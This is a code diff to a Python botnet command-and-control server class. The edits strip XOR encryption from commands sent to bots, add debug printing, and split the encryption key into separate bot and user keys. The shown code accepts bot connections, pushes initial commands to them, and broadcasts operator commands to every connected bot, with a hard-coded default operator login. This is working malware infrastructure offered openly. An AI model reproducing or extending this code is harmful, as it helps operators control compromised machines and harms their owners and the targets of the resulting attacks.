@@ -35,15 +35,12 @@ class Botnet_C_C_Server:
             if self.sending==False:
                 break
         self.sending=True
+        print(command)
         for client_socket in self.bots_list:
             try:
-                if self.xor_encryption_key!=None:
-                    command=XOR.encrypt(command,self.xor_encryption_key)
-                else:
-                    command=command
                 client_socket.send("{}".format(command).encode())
             except Exception as ex:
-                #raise Exception(ex)
+                print(ex)#raise Exception(ex)
                 try:
                     client_socket.close()
                 except:
@@ -58,10 +55,7 @@ class Botnet_C_C_Server:
     def handle_bot(self,client_socket):
         try:
             for x in self.initial_commands_list:
-                if self.xor_encryption_key!=None:
-                    command=XOR.encrypt(x,self.xor_encryption_key)
-                else:
-                    command=x
+                command=x
                 client_socket.send("{}".format(command).encode())
                 while True:
                     data = client_socket.recv(self.socket_buffer_size)
@@ -102,13 +96,13 @@ class Botnet_C_C_Server:
                 client_socket.send('login failed'.encode())
                 client_socket.close()
         except Exception as ex:
-            pass
+            raise(ex)
         try:
             client_socket.close()
         except:
             pass
 
-    def __init__(self,users_host='0.0.0.0',ping_command='',pings_interval=5,threads_daemon=False,users_port=22222,bots_host='0.0.0.0',bots_port=7777,socket_buffer_size=4096,max_users=5,max_bots=100,logs=False,initial_commands_list=[],xor_encryption_key=None,users=[{"username":"ala_sensei","password":"ala_sensei"}]):
+    def __init__(self,users_host='0.0.0.0',ping_command='',pings_interval=5,threads_daemon=False,users_encryption_key=None,users_port=22222,bots_host='0.0.0.0',bots_port=7777,socket_buffer_size=4096,max_users=5,max_bots=100,logs=False,initial_commands_list=[],bots_encryption_key=None,users=[{"username":"ala_sensei","password":"ala_sensei"}]):
         self.ping_command=ping_command
         self.bots_list=[]
         self.bots_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -121,7 +115,8 @@ class Botnet_C_C_Server:
         self.pings_interval=pings_interval
         self.users=users
         self.threads_daemon=threads_daemon
-        self.xor_encryption_key=xor_encryption_key
+        self.bots_encryption_key=bots_encryption_key
+        self.users_encryption_key=users_encryption_key
         self.logs=logs
         self.initial_commands_list=initial_commands_list
         self.socket_buffer_size=socket_buffer_size
